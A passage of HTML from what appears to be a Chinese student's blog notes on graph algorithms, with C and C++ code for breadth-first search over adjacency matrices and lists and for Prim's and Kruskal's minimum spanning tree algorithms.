class="hljs-number">1</span>&amp;&amp;ints[i]==<span class="hljs-number">0</span>) &#123;<br>                queue.<span class="hljs-built_in">push</span>(i);<br>                ints[i]=<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;amGraph-&gt;vexs[queue.<span class="hljs-built_in">front</span>()];<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    pAMGraph amGraph = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">int</span> num;<br>    cin &gt;&gt; num;<span class="hljs-comment">//输入节点数</span><br>    <span class="hljs-built_in">creatGraph</span>(amGraph, num);<br>    <span class="hljs-type">int</span> *ints=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[num];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-comment">//将被查看表全部设为0</span><br>    <span class="hljs-built_in">BFS</span>(amGraph, ints, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">delete</span>[] ints;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="邻接表-1"><a href="#邻接表-1" class="headerlink" title="邻接表"></a>邻接表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph,<span class="hljs-type">int</span> num)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br><br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br><br><br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-keyword">if</span>(adjList[sub].vex==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[sub]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>        ints[sub]=<span class="hljs-number">1</span>;<br>    &#125;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[moveNode-&gt;adjvex].vex);<br>            ints[moveNode-&gt;adjvex]=<span class="hljs-number">1</span>;<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    BFS(adjList,ints,sub+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input the number of node: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>    <span class="hljs-type">int</span>* ints = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>)*num);<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<br>    creatGraph(&amp;amGraph,num);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    BFS(adjList,ints,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87.png"></p><h4 id="两种算法的比较"><a href="#两种算法的比较" class="headerlink" title="两种算法的比较"></a>两种算法的比较</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E5%92%8CDFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%9B%8A%E6%AF%94%E8%BE%83.png"></p><h2 id="图的应用"><a href="#图的应用" class="headerlink" title="图的应用"></a>图的应用</h2><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><ol><li><p>概念回顾</p><ul><li><p>生成树</p><p>所有的顶点，均有边连接起来，不存在回路；也就是全部顶点，部分边</p></li></ul></li><li><p>最小生成树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91.png"></p></li><li><p>构造最小数生成树</p><ul><li><p>MST性质：设N&#x3D;(V,E)是一个连通的网，存在一个U是顶点集V的非空子集。若边（u,v）是一条具有最小权值的边，其中u包含于U,v包含于V，则一定存在一个最小生成树，包含边（u,v）</p></li><li><p><code>prim</code>普利姆算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/prim%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatemMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> minWeight;<br>    <span class="hljs-type">int</span> weight[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> correlativeSub[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>      <br>    <span class="hljs-comment">//将第一个点的相关的权值记录下来</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[minSub][i];<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;the begin point is: &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; std::endl;<br>      <br>    <span class="hljs-comment">//最小生成树</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        minWeight = MaxInt;<br>      <br>        <span class="hljs-comment">//找到最小的值和权值，记录这个点,更新minWeight</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &lt; minWeight &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                minWeight = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>      <br>      <br>        std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; amGraph.vexs[correlativeSub[minSub]] &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot; )   point is： &quot;</span><br>                  &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot;   weight is: &quot;</span> &lt;&lt; minWeight &lt;&lt; std::endl;<br>        weight[minSub] = <span class="hljs-number">0</span>;<span class="hljs-comment">//防止再次调用</span><br>      <br>        <span class="hljs-comment">//更新weight[]</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &gt; amGraph.arcs[i][j] &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                weight[j] = amGraph.arcs[i][j];<br>                correlativeSub[j] = minSub;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreatemMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure></li><li><p>克鲁斯卡尔算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%8B%E9%B2%81%E6%96%AF%E5%8D%A1%E5%B0%94%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    <span class="hljs-type">int</span> begin;<br>    <span class="hljs-type">int</span> end;<br>    <span class="hljs-type">int</span> weight;<br>&#125;;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetEdges</span><span class="hljs-params">(AMGraph &amp;amGraph, std::vector&lt;Edge&gt; &amp;edges)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            Edge edge;<br>            edge.begin = i;<br>            edge.end = j;<br>            edge.weight = amGraph.arcs[i][j];<br>            edges.<span class="hljs-built_in">emplace_back</span>(edge);<br>        &#125;<br>    &#125;<br>      <br>    std::<span class="hljs-built_in">sort</span>(edges.<span class="hljs-built_in">begin</span>(), edges.<span class="hljs-built_in">end</span>(), [](Edge a, Edge b) &#123;<br>        <span class="hljs-keyword">return</span> a.weight &lt; b.weight;<br>    &#125;);<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt; &amp;sub, <span class="hljs-type">int</span> begin)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (sub[begin] &gt; <span class="hljs-number">0</span>) &#123;<br>        begin = sub[begin];<span class="hljs-comment">//找到是否连成了闭环</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> begin;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    std::vector&lt;Edge&gt; edges;<br>    <span 